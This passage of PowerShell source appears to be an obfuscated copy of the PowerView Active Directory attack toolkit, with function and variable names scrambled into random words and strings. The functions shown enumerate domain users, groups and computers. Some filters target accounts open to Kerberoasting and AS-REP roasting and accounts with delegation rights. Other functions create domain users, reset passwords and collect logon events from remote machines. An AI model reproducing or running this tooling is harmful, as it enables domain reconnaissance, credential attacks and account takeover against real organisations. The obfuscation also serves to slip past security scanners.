        $yYbdCgmi99 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $pOEBHAKg99 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $KSBEivkG99 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $xfOIjAld99 = @{}
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['LDAPFilter']) { $xfOIjAld99['LDAPFilter'] = $RUtJqxpA99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $jCmysHTh99 = philately -XQOKQXGr99 $XQOKQXGr99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $jCmysHTh99 = philately -XQOKQXGr99 $XQOKQXGr99 -ZiReXCQu99 $ZiReXCQu99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[strategy] Enumerated forest '$jCmysHTh99' for target domain '$XQOKQXGr99'"
        }

        $TMlyMdkj99 = @{}
        if ($PSBoundParameters['Credential']) { $TMlyMdkj99['Credential'] = $ZiReXCQu99 }
        if ($jCmysHTh99) {
            $TMlyMdkj99['Forest'] = $jCmysHTh99
        }
    }

    PROCESS {

        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[strategy] Using specified -SlpeaWYH99"
            $btvaBFMO99 = $SlpeaWYH99
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[strategy] Extracting property names from -AzkhARCn99 to use as the reference property set"
            $btvaBFMO99 = Get-Member -PMIEavdF99 $AzkhARCn99 -MemberType NoteProperty | Select-Object -Expand Name
            $gHSvMkGP99 = $AzkhARCn99.objectclass | Select-Object -Last 1
            Write-Verbose "[strategy] Calculated ReferenceObjectClass : $gHSvMkGP99"
        }
        else {
            Write-Verbose "[strategy] Using the default reference property set for the object class '$MvqXMIWW99'"
        }

        if (($MvqXMIWW99 -eq 'User') -or ($gHSvMkGP99 -eq 'User')) {
            $qMLXsPKs99 = bobcats @SearcherArguments
            if (-not $btvaBFMO99) {
                $btvaBFMO99 = $yYbdCgmi99
            }
        }
        elseif (($MvqXMIWW99 -eq 'Group') -or ($gHSvMkGP99 -eq 'Group')) {
            $qMLXsPKs99 = grownup @SearcherArguments
            if (-not $btvaBFMO99) {
                $btvaBFMO99 = $pOEBHAKg99
            }
        }
        elseif (($MvqXMIWW99 -eq 'Computer') -or ($gHSvMkGP99 -eq 'Computer')) {
            $qMLXsPKs99 = Rankine @SearcherArguments
            if (-not $btvaBFMO99) {
                $btvaBFMO99 = $KSBEivkG99
            }
        }
        else {
            throw "[strategy] Invalid class: $MvqXMIWW99"
        }

        ForEach ($Object in $qMLXsPKs99) {
            $djywXOyM99 = Get-Member -PMIEavdF99 $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($LmNlYAJz99 in $djywXOyM99) {
                if ($btvaBFMO99 -NotContains $LmNlYAJz99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $LmNlYAJz99
                    $Out | Add-Member Noteproperty 'Value' $Object.$LmNlYAJz99
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}



function bobcats {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $aCzrnrLk99,

        [Switch]
        $SPN,

        [Switch]
        $eXxHshMC99,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $plscMGmG99,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $HLwlppEb99,

        [Switch]
        $yCJiRRdh99,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $IOvBpiTI99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $evFJPxJs99 = [Enum]::GetNames($CaGOukxX99)
        $evFJPxJs99 = $evFJPxJs99 | ForEach-Object {$_; "NOT_$_"}
        prostrates -Name UACFilter -TVGxsQnM99 $evFJPxJs99 -Type ([array])
    }

    BEGIN {
        $xfOIjAld99 = @{}
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $liifhnZp99 = foaling @SearcherArguments
    }

    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            prostrates -rgjbmZdj99 -bKctLDxk99 $PSBoundParameters
        }

        if ($liifhnZp99) {
            $zdhlwIap99 = ''
            $cqPynTGG99 = ''
            $aCzrnrLk99 | Where-Object {$_} | ForEach-Object {
                $JmddWUUS99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($JmddWUUS99 -match '^S-1-') {
                    $zdhlwIap99 += "(objectsid=$JmddWUUS99)"
                }
                elseif ($JmddWUUS99 -match '^CN=') {
                    $zdhlwIap99 += "(distinguishedname=$JmddWUUS99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $MuprcxcZ99 = $JmddWUUS99.SubString($JmddWUUS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[bobcats] Extracted domain '$MuprcxcZ99' from '$JmddWUUS99'"
                        $xfOIjAld99['Domain'] = $MuprcxcZ99
                        $liifhnZp99 = foaling @SearcherArguments
                        if (-not $liifhnZp99) {
                            Write-Warning "[bobcats] Unable to retrieve domain searcher for '$MuprcxcZ99'"
                        }
                    }
                }
                elseif ($JmddWUUS99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $osroZIBb99 = (([Guid]$JmddWUUS99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $zdhlwIap99 += "(objectguid=$osroZIBb99)"
                }
                elseif ($JmddWUUS99.Contains('\')) {
                    $jiHKRwfa99 = $JmddWUUS99.Replace('\28', '(').Replace('\29', ')') | jiggering -hKoxCyte99 Canonical
                    if ($jiHKRwfa99) {
                        $tpoFORKS99 = $jiHKRwfa99.SubString(0, $jiHKRwfa99.IndexOf('/'))
                        $OpgheHcJ99 = $JmddWUUS99.Split('\')[1]
                        $zdhlwIap99 += "(samAccountName=$OpgheHcJ99)"
                        $xfOIjAld99['Domain'] = $tpoFORKS99
                        Write-Verbose "[bobcats] Extracted domain '$tpoFORKS99' from '$JmddWUUS99'"
                        $liifhnZp99 = foaling @SearcherArguments
                    }
                }
                else {
                    $zdhlwIap99 += "(samAccountName=$JmddWUUS99)"
                }
            }

            if ($zdhlwIap99 -and ($zdhlwIap99.Trim() -ne '') ) {
                $cqPynTGG99 += "(|$zdhlwIap99)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[bobcats] Searching for non-null service principal names'
                $cqPynTGG99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[bobcats] Searching for users who can be delegated'
                $cqPynTGG99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[bobcats] Searching for users who are sensitive and not trusted for delegation'
                $cqPynTGG99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[bobcats] Searching for adminCount=1'
                $cqPynTGG99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[bobcats] Searching for users that are trusted to authenticate for other principals'
                $cqPynTGG99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[bobcats] Searching for user accounts that do not require kerberos preauthenticate'
                $cqPynTGG99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[bobcats] Using additional LDAP filter: $RUtJqxpA99"
                $cqPynTGG99 += "$RUtJqxpA99"
            }

            $DjNQYgqY99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $zWlRLVUz99 = $_.Substring(4)
                    $IfcDPFUO99 = [Int]($CaGOukxX99::$zWlRLVUz99)
                    $cqPynTGG99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$IfcDPFUO99))"
                }
                else {
                    $IfcDPFUO99 = [Int]($CaGOukxX99::$_)
                    $cqPynTGG99 += "(userAccountControl:1.2.840.113556.1.4.803:=$IfcDPFUO99)"
                }
            }

            $liifhnZp99.filter = "(&(samAccountType=805306368)$cqPynTGG99)"
            Write-Verbose "[bobcats] filter string: $($liifhnZp99.filter)"

            if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $liifhnZp99.FindOne() }
            else { $vDOGrGBR99 = $liifhnZp99.FindAll() }
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = meridian -kaLEgole99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($vDOGrGBR99) {
                try { $vDOGrGBR99.dispose() }
                catch {
                    Write-Verbose "[bobcats] Error disposing of the Results object: $_"
                }
            }
            $liifhnZp99.dispose()
        }
    }
}


function bulging {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $dABDhgNe99,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $srsNEPUt99,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $WxzTuYkd99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ghlbqhmM99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    $rdEReMRy99 = @{
        'Identity' = $dABDhgNe99
    }
    if ($PSBoundParameters['Domain']) { $rdEReMRy99['Domain'] = $XQOKQXGr99 }
    if ($PSBoundParameters['Credential']) { $rdEReMRy99['Credential'] = $ZiReXCQu99 }
    $ezvcgGct99 = starched @ContextArguments

    if ($ezvcgGct99) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($ezvcgGct99.Context)

        $User.SamAccountName = $ezvcgGct99.Identity
        $UVtHNVmF99 = New-Object System.Management.Automation.PSCredential('a', $srsNEPUt99)
        $User.SetPassword($UVtHNVmF99.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $ezvcgGct99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $WxzTuYkd99
        }
        else {
            $User.DisplayName = $ezvcgGct99.Identity
        }

        if ($PSBoundParameters['Description']) {
            $User.Description = $ghlbqhmM99
        }

        Write-Verbose "[bulging] Attempting to create user '$dABDhgNe99'"
        try {
            $Null = $User.Save()
            Write-Verbose "[bulging] User '$dABDhgNe99' successfully created"
            $User
        }
        catch {
            Write-Warning "[bulging] Error creating user '$dABDhgNe99' : $_"
        }
    }
}


function reprinted {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $aCzrnrLk99,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $srsNEPUt99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    $rdEReMRy99 = @{ 'Identity' = $aCzrnrLk99 }
    if ($PSBoundParameters['Domain']) { $rdEReMRy99['Domain'] = $XQOKQXGr99 }
    if ($PSBoundParameters['Credential']) { $rdEReMRy99['Credential'] = $ZiReXCQu99 }
    $ezvcgGct99 = starched @ContextArguments

    if ($ezvcgGct99) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($ezvcgGct99.Context, $aCzrnrLk99)

        if ($User) {
            Write-Verbose "[reprinted] Attempting to set the password for user '$aCzrnrLk99'"
            try {
                $UVtHNVmF99 = New-Object System.Management.Automation.PSCredential('a', $srsNEPUt99)
                $User.SetPassword($UVtHNVmF99.GetNetworkCredential().Password)

                $Null = $User.Save()
                Write-Verbose "[reprinted] Password for user '$aCzrnrLk99' successfully reset"
            }
            catch {
                Write-Warning "[reprinted] Error setting password for user '$aCzrnrLk99' : $_"
            }
        }
        else {
            Write-Warning "[reprinted] Unable to find user '$aCzrnrLk99'"
        }
    }
}


function homburg {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $dOSflyxA99 = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LSmUhHgs99 = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $ncTXkyQU99 = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CckzXyWp99 = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($dOSflyxA99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($LSmUhHgs99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($dOSflyxA99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($LSmUhHgs99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $dbQisfyh99 = @{
            'FilterXPath' = $CckzXyWp99
            'LogName' = 'Security'
            'MaxEvents' = $ncTXkyQU99
        }
        if ($PSBoundParameters['Credential']) { $dbQisfyh99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {

            $dbQisfyh99['ComputerName'] = $LqojfQUN99

            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $kaLEgole99 = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $kaLEgole99[5].Value.EndsWith('$')) {
                            $BjYCzrxj99 = New-Object PSObject -Property @{
                                ComputerName              = $LqojfQUN99
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $kaLEgole99[0].Value.ToString()
                                SubjectUserName           = $kaLEgole99[1].Value
                                SubjectDomainName         = $kaLEgole99[2].Value
                                SubjectLogonId            = $kaLEgole99[3].Value
                                TargetUserSid             = $kaLEgole99[4].Value.ToString()
                                TargetUserName            = $kaLEgole99[5].Value
                                TargetDomainName          = $kaLEgole99[6].Value
                                TargetLogonId             = $kaLEgole99[7].Value
                                LogonType                 = $kaLEgole99[8].Value
                                LogonProcessName          = $kaLEgole99[9].Value
                                AuthenticationPackageName = $kaLEgole99[10].Value
                                WorkstationName           = $kaLEgole99[11].Value
                                LogonGuid                 = $kaLEgole99[12].Value
                                TransmittedServices       = $kaLEgole99[13].Value
                                LmPackageName             = $kaLEgole99[14].Value
                                KeyLength                 = $kaLEgole99[15].Value
                                ProcessId                 = $kaLEgole99[16].Value
                                ProcessName               = $kaLEgole99[17].Value
                                IpAddress                 = $kaLEgole99[18].Value
                                IpPort                    = $kaLEgole99[19].Value
                                ImpersonationLevel        = $kaLEgole99[20].Value
                                RestrictedAdminMode       = $kaLEgole99[21].Value
                                TargetOutboundUserName    = $kaLEgole99[22].Value
                                TargetOutboundDomainName  = $kaLEgole99[23].Value
                                VirtualAccount            = $kaLEgole99[24].Value
                                TargetLinkedLogonId       = $kaLEgole99[25].Value
                                ElevatedToken             = $kaLEgole99[26].Value
                            }
                            $BjYCzrxj99.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $BjYCzrxj99
                        }
                    }

                    4648 {
                        if((-not $kaLEgole99[5].Value.EndsWith('$')) -and ($kaLEgole99[11].Value -match 'taskhost\.exe')) {
                            $BjYCzrxj99 = New-Object PSObject -Property @{
                                ComputerName              = $LqojfQUN99
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $kaLEgole99[0].Value.ToString()
                                SubjectUserName   = $kaLEgole99[1].Value
                                SubjectDomainName = $kaLEgole99[2].Value
                                SubjectLogonId    = $kaLEgole99[3].Value
                                LogonGuid         = $kaLEgole99[4].Value.ToString()
                                TargetUserName    = $kaLEgole99[5].Value
                                TargetDomainName  = $kaLEgole99[6].Value
                                TargetLogonGuid   = $kaLEgole99[7].Value
                                TargetServerName  = $kaLEgole99[8].Value
                                TargetInfo        = $kaLEgole99[9].Value
                                ProcessId         = $kaLEgole99[10].Value
                                ProcessName       = $kaLEgole99[11].Value
                                IpAddress         = $kaLEgole99[12].Value
                                IpPort            = $kaLEgole99[13].Value
                            }
                            $BjYCzrxj99.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $BjYCzrxj99
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}


function interfered {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $InsZFrEE99 = @{}
    if ($PSBoundParameters['Credential']) { $InsZFrEE99['Credential'] = $ZiReXCQu99 }

    try {
        $QRJYLfRv99 = (presumably @ForestArguments).schema.name
    }
    catch {
        throw '[interfered] Error in retrieving forest schema path from presumably'
    }
    if (-not $QRJYLfRv99) {
        throw '[interfered] Error in retrieving forest schema path from presumably'
    }

    $xfOIjAld99 = @{
        'SearchBase' = $QRJYLfRv99
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
    if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
    if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
    if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
    $xKNHhvto99 = foaling @SearcherArguments

    if ($xKNHhvto99) {
        try {
            $vDOGrGBR99 = $xKNHhvto99.FindAll()
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($vDOGrGBR99) {
                try { $vDOGrGBR99.dispose() }
                catch {
                    Write-Verbose "[interfered] Error disposing of the Results object: $_"
                }
            }
            $xKNHhvto99.dispose()
        }
        catch {
            Write-Verbose "[interfered] Error in building GUID map: $_"
        }
    }

    $xfOIjAld99['SearchBase'] = $QRJYLfRv99.replace('Schema','Extended-Rights')
    $xfOIjAld99['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $nQxeoopm99 = foaling @SearcherArguments

    if ($nQxeoopm99) {
        try {
            $vDOGrGBR99 = $nQxeoopm99.FindAll()
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($vDOGrGBR99) {
                try { $vDOGrGBR99.dispose() }
                catch {
                    Write-Verbose "[interfered] Error disposing of the Results object: $_"
                }
            }
            $nQxeoopm99.dispose()
        }
        catch {
            Write-Verbose "[interfered] Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function Rankine {

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $aCzrnrLk99,

        [Switch]
        $gxCjQSqn99,

        [Switch]
        $yCJiRRdh99,

        [Switch]
        $YIopCxtY99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $DfPrQYoc99,

        [ValidateNotNullOrEmpty()]
        [String]
        $kKsiFEfu99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ZBmuuCEe99,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $evFJPxJs99 = [Enum]::GetNames($CaGOukxX99)
        $evFJPxJs99 = $evFJPxJs99 | ForEach-Object {$_; "NOT_$_"}
        prostrates -Name UACFilter -TVGxsQnM99 $evFJPxJs99 -Type ([array])
    }

    BEGIN {
        $xfOIjAld99 = @{}
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
